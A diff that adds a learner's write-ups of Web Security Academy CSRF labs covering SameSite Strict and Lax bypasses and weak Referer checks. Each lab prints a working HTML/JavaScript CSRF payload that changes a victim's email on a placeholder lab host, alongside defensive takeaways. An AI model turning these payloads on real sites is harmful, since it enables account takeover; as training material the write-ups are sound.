@@ -222,3 +222,181 @@ and treated the request like a POST request.
 ### Key Takeaway
 
 SameSite Lax is not enough if the application allows state-changing actions through GET requests or method override.
+
+## Lab 08: SameSite Strict Bypass via Client-Side Redirect
+
+This lab showed how `SameSite=Strict` can be bypassed using a client-side redirect gadget.
+
+The site had a redirect page:
+
+```text
+/post/comment/confirmation?postId=
+```
+
+The JavaScript on this page used the `postId` value to redirect the user.
+
+By controlling `postId`, the exploit redirected the victim to:
+
+```text
+/my-account/change-email
+```
+
+The exploit was:
+
+```html
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=victim-strict-bypass%40test.com%26submit=1";
+</script>
+```
+
+The important part was:
+
+```text
+1/../../my-account/change-email
+```
+
+This used path traversal to make the redirect reach the email change endpoint.
+
+### Key Takeaway
+
+`SameSite=Strict` helps reduce CSRF, but it is not enough if the application has a redirect gadget that can trigger same-site requests to sensitive endpoints.
+
+
+## Pending Lab-09: SameSite Strict Bypass via Sibling Domain
+
+Status: Pending - Tool Limitation
+
+This lab requires Burp Collaborator / Burp Suite Professional because the intended solution exfiltrates the victim's WebSocket chat history to the Collaborator server.
+
+The lab was reviewed conceptually. It combines SameSite Strict bypass, reflected XSS on a sibling domain, and cross-site WebSocket hijacking.
+
+It will be revisited later when Burp Collaborator access is available.
+
+## Lab 10: SameSite Lax Bypass via Cookie Refresh
+
+This lab showed how `SameSite=Lax` can be bypassed by refreshing the session cookie.
+
+The application used OAuth login.
+
+OAuth login means the user logs in through another trusted service, then the website creates a session cookie after the login finishes.
+
+The exploit used this behavior by opening:
+
+```text id="lngai2"
+/social-login
+```
+
+This refreshed the victim's session cookie.
+
+Then the exploit waited 5 seconds and submitted the email change form:
+
+```html id="fj6q7d"
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="samesite-refresh@test.com">
+</form>
+
+<p>Click anywhere on the page</p>
+
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
+
+The user click was needed because browsers block popups unless they are triggered by user interaction.
+
+### Key Takeaway
+
+`SameSite=Lax` helps reduce CSRF, but it should not replace CSRF tokens.
+
+A fresh session cookie can still allow a cross-site POST request for a short time.
+
+## Lab 11: CSRF Where Referer Validation Depends on Header Being Present
+
+This lab showed a weak CSRF defense based on the `Referer` header.
+
+The `Referer` header tells the server where the request came from.
+
+The application rejected the request when the `Referer` was external:
+
+```text id="ez7fy1"
+Referer: https://evil.com
+```
+
+But it accepted the request when the `Referer` header was missing.
+
+The exploit used:
+
+```html id="eucshh"
+<meta name="referrer" content="no-referrer">
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="referer-final@test.com">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+The meta tag removed the `Referer` header, and the form submitted the email change request.
+
+### Key Takeaway
+
+`Referer` validation should not be used as the main CSRF protection.
+
+If the application accepts requests with a missing `Referer`, the protection can be bypassed.
+
+## Lab 12: CSRF with Broken Referer Validation
+
+This lab showed a weak `Referer` validation check.
+
+The application rejected this:
+
+```text id="ymflv4"
+Referer: https://evil.com
+```
+
+But accepted this:
+
+```text id="kcjbup"
+Referer: https://evil.com?YOUR-LAB-ID.web-security-academy.net
+```
+
+The issue was that the application only checked whether the expected domain appeared somewhere in the `Referer` header.
+
+The exploit used:
+
+```html id="w73jax"
+<script>
+    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
+</script>
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="broken-referer@test.com">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+The Exploit Server head section used:
+
+```text id="dean7o"
+Referrer-Policy: unsafe-url
+```
+
+This made the browser include the full exploit URL in the `Referer` header.
+
+### Key Takeaway
+
+`Referer` validation must check the real origin properly.
+
+It is insecure to only check whether the trusted domain appears somewhere in the header value.
